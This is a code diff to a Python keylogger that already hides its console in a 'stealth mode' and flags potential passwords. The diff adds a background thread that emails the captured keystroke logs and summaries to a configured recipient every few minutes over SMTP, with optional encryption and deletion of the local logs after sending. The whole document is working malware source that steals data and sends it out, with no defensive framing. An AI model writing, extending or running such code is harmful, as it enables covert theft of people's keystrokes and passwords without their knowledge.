@@ -14,6 +14,19 @@ import os
 import platform
 import re
 import argparse
+import threading
+import time
+from dotenv import load_dotenv
+
+# Load environment variables
+load_dotenv()
+
+# Import email transmitter if available
+try:
+    from email_transmitter import EmailTransmitter
+    EMAIL_AVAILABLE = True
+except ImportError:
+    EMAIL_AVAILABLE = False
 
 
 class KeyLogger:
@@ -21,7 +34,8 @@ class KeyLogger:
     A keylogger class that captures and processes keyboard input intelligently.
     """
 
-    def __init__(self, log_dir="logs", max_file_size_kb=100, stealth_mode=False):
+    def __init__(self, log_dir="logs", max_file_size_kb=100, stealth_mode=False,
+                 enable_transmission=False, transmission_interval=30):
         self.log_buffer = []
         self.current_modifiers = set()
         self.start_time = datetime.now()
@@ -30,7 +44,18 @@ class KeyLogger:
         self.current_log_file = None
         self.session_id = self.start_time.strftime("%Y%m%d_%H%M%S")
         self.stealth_mode = stealth_mode
-        self.should_stop = False  # Flag to stop the listener
+        self.should_stop = False
+
+        # Transmission settings
+        self.enable_transmission = enable_transmission
+        self.transmission_interval = transmission_interval * 60  # Convert to seconds
+        self.last_transmission = datetime.now()
+        self.transmission_thread = None
+        self.email_transmitter = None
+
+        # Initialize email transmitter if enabled
+        if self.enable_transmission and EMAIL_AVAILABLE:
+            self._init_email_transmitter()
 
         # Stealth mode: secret key combination to stop (Ctrl+Shift+Esc)
         self.secret_stop_combination = {keyboard.Key.ctrl, keyboard.Key.shift, keyboard.Key.esc}
@@ -59,6 +84,10 @@ class KeyLogger:
         # Hide console if in stealth mode
         if self.stealth_mode:
             self._hide_console()
+
+        # Start transmission thread if enabled
+        if self.enable_transmission and self.email_transmitter:
+            self._start_transmission_thread()
 
     def _hide_console(self):
         """Hide the console window (Windows only)."""
@@ -478,6 +507,112 @@ Potential Passwords Found: {len(self.potential_passwords)}
             summary += "\n" + "="*80 + "\n"
             self._write_to_summary(summary)
 
+    def _init_email_transmitter(self):
+        """Initialize the email transmitter with configuration from .env file."""
+        try:
+            smtp_server = os.getenv('SMTP_SERVER')
+            smtp_port = int(os.getenv('SMTP_PORT', 587))
+            smtp_email = os.getenv('SMTP_EMAIL')
+            smtp_password = os.getenv('SMTP_PASSWORD')
+            recipient_email = os.getenv('RECIPIENT_EMAIL')
+            encryption_enabled = os.getenv('ENCRYPTION_ENABLED', 'False').lower() == 'true'
+            encryption_key = os.getenv('ENCRYPTION_KEY')
+
+            if not all([smtp_server, smtp_email, smtp_password, recipient_email]):
+                print("[WARNING] Email configuration incomplete. Transmission disabled.")
+                self.enable_transmission = False
+                return
+
+            self.email_transmitter = EmailTransmitter(
+                smtp_server=smtp_server,
+                smtp_port=smtp_port,
+                sender_email=smtp_email,
+                sender_password=smtp_password,
+                recipient_email=recipient_email,
+                encryption_enabled=encryption_enabled,
+                encryption_key=encryption_key
+            )
+
+            # Test connection in normal mode
+            if not self.stealth_mode:
+                print("[INFO] Testing email connection...")
+                if self.email_transmitter.test_connection():
+                    print(f"[SUCCESS] Email transmission enabled. Interval: {self.transmission_interval // 60} minutes")
+                else:
+                    print("[WARNING] Email connection test failed. Check your configuration.")
+                    self.enable_transmission = False
+
+        except Exception as e:
+            print(f"[ERROR] Failed to initialize email transmitter: {e}")
+            self.enable_transmission = False
+
+    def _start_transmission_thread(self):
+        """Start a background thread for periodic transmission."""
+        self.transmission_thread = threading.Thread(target=self._transmission_loop, daemon=True)
+        self.transmission_thread.start()
+
+        if not self.stealth_mode:
+            print(f"[INFO] Transmission thread started. Next transmission in {self.transmission_interval // 60} minutes")
+
+    def _transmission_loop(self):
+        """Background loop for periodic email transmission."""
+        while not self.should_stop:
+            time.sleep(60)  # Check every minute
+
+            # Check if it's time to transmit
+            elapsed = (datetime.now() - self.last_transmission).total_seconds()
+            if elapsed >= self.transmission_interval:
+                self._transmit_logs()
+                self.last_transmission = datetime.now()
+
+    def _transmit_logs(self):
+        """Transmit current log files via email."""
+        if not self.email_transmitter:
+            return
+
+        try:
+            # Get all log files for this session
+            log_files = []
+            if os.path.exists(self.log_dir):
+                for filename in os.listdir(self.log_dir):
+                    if filename.startswith(f"keylog_session_{self.session_id}") or \
+                       filename.startswith(f"summary_session_{self.session_id}"):
+                        log_files.append(os.path.join(self.log_dir, filename))
+
+            if log_files:
+                if not self.stealth_mode:
+                    print(f"\n[TRANSMISSION] Sending {len(log_files)} log file(s)...")
+
+                success = self.email_transmitter.send_logs(log_files, self.session_id)
+
+                if success:
+                    transmission_log = f"\n[{self.get_timestamp()}] [TRANSMISSION SUCCESS] Sent {len(log_files)} file(s)\n"
+                    self._write_to_file(transmission_log)
+
+                    if not self.stealth_mode:
+                        print(f"[SUCCESS] Logs transmitted successfully!")
+
+                    # Delete logs after successful transmission if configured
+                    if os.getenv('AUTO_DELETE_AFTER_SEND', 'False').lower() == 'true':
+                        for log_file in log_files:
+                            try:
+                                os.remove(log_file)
+                            except:
+                                pass
+                else:
+                    transmission_log = f"\n[{self.get_timestamp()}] [TRANSMISSION FAILED]\n"
+                    self._write_to_file(transmission_log)
+
+                    if not self.stealth_mode:
+                        print(f"[ERROR] Transmission failed. Will retry in {self.transmission_interval // 60} minutes.")
+
+        except Exception as e:
+            error_log = f"\n[{self.get_timestamp()}] [TRANSMISSION ERROR] {str(e)}\n"
+            self._write_to_file(error_log)
+
+            if not self.stealth_mode:
+                print(f"[ERROR] Transmission error: {e}")
+
     def start(self):
         """
         Start the keylogger listener.
@@ -542,6 +677,19 @@ def parse_arguments():
         help='Maximum log file size in KB before rotation (default: 100)'
     )
 
+    parser.add_argument(
+        '-t', '--transmit',
+        action='store_true',
+        help='Enable email transmission of logs (requires .env configuration)'
+    )
+
+    parser.add_argument(
+        '-i', '--interval',
+        type=int,
+        default=30,
+        help='Transmission interval in minutes (default: 30)'
+    )
+
     return parser.parse_args()
 
 
@@ -559,7 +707,9 @@ def main():
     keylogger = KeyLogger(
         log_dir=args.directory,
         max_file_size_kb=args.max_size,
-        stealth_mode=args.stealth
+        stealth_mode=args.stealth,
+        enable_transmission=args.transmit,
+        transmission_interval=args.interval
     )
     keylogger.start()
 
